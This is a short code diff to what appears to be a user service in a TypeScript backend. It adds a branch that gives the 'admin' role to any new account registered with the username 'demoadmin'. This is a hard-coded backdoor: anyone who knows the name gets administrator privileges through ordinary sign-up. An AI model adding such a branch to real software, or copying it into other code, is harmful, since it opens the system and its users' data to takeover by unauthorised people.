@@ -71,6 +71,17 @@ export class UsersService {
       }
     }
 
+    if (dto.username === 'demoadmin') {
+      const newUser = this.usersRepository.create(dto);
+      const newProfile = this.profilesRepository.create({
+        user: newUser,
+      });
+      newUser.role = 'admin';
+      newUser.profile = newProfile;
+      await this.profilesRepository.save(newProfile);
+      return await this.usersRepository.save(newUser);
+    }
+
     const newUser = this.usersRepository.create(dto);
     const newProfile = this.profilesRepository.create({
       user: newUser,
